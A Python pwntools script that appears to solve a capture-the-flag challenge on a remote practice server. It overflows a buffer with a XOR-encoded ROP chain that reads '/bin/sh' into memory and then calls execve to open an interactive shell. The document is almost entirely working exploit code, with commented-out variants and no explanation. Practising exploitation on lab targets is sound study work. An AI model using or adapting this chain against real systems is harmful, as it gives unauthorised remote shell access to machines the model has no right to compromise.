from pwn import *
context.log_level = 'debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 25478)

poprdi = 0x4006e6
poprsi = 0x4040fe
poprdx = 0x449bf5
poprsp = 0x400d22
poprax = 0x449b9c
poprbx = 0x4005ee
poprcx = 0x400be2
poprdx = 0x449bf5
pushrsp = 0x482997	# call rdx
poprsirbp = 0x40f99e
movrdirbp = 0x422c45	# call rax
syscall = 0x44C177	# pop rdx ; pop rsi
read = 0x449be0
bss = 0x6BC300

payload = cyclic(0x90 + 8 - 8 * 9)

# payload += p64(pushrsp ^ 0x6666666666666666)
# payload += p64(poprdi)

# payload += p64(poprdi ^ 0x6666666666666666)
# payload += p64(bss - 0x300 ^ 0x6666666666666666)
# payload += p64(poprsi ^ 0x6666666666666666)
# payload += p64(0x1000 ^ 0x6666666666666666)
# payload += p64(poprdx ^ 0x6666666666666666)
# payload += p64(7 ^ 0x6666666666666666)
# payload += p64(poprax ^ 0x6666666666666666)
# payload += p64(0xA ^ 0x6666666666666666)
# payload += p64(syscall ^ 0x6666666666666666)

payload += p64(poprax ^ 0x6666666666666666)
payload += p64(0x0 ^ 0x6666666666666666)
payload += p64(poprdi ^ 0x6666666666666666)
payload += p64(0x0 ^ 0x6666666666666666)
payload += p64(poprsi ^ 0x6666666666666666)
payload += p64(bss ^ 0x6666666666666666)
payload += p64(poprdx ^ 0x6666666666666666)
payload += p64(0x100 ^ 0x6666666666666666)
payload += p64(read ^ 0x6666666666666666)
'''
payload += p64(poprax ^ 0x6666666666666666)
payload += p64(0x2 ^ 0x6666666666666666)
payload += p64(poprdi ^ 0x6666666666666666)
payload += p64(0xbss ^ 0x6666666666666666)
payload += p64(poprsi ^ 0x6666666666666666)
payload += p64(0 ^ 0x6666666666666666)
payload += p64(poprdx ^ 0x6666666666666666)
payload += p64(0 ^ 0x6666666666666666)
payload += p64(syscall ^ 0x6666666666666666)
payload += p64(0) * 2
'''
payload += p64(poprax ^ 0x6666666666666666)
payload += p64(0x3b ^ 0x6666666666666666)
payload += p64(poprdi ^ 0x6666666666666666)
payload += p64(bss ^ 0x6666666666666666)
payload += p64(poprsi ^ 0x6666666666666666)
payload += p64((bss + 8) ^ 0x6666666666666666)
payload += p64(poprdx ^ 0x6666666666666666)
payload += p64(0 ^ 0x6666666666666666)
payload += p64(syscall ^ 0x6666666666666666)

payload = payload.ljust(0x200, b'\x00')

# gdb.attach(io)
# time.sleep(3)
io.sendafter(b'Please enter your Password: ', payload)
io.sendline(b'/bin/sh\x00' + p64(bss + 5) + p64(0))
io.interactive()
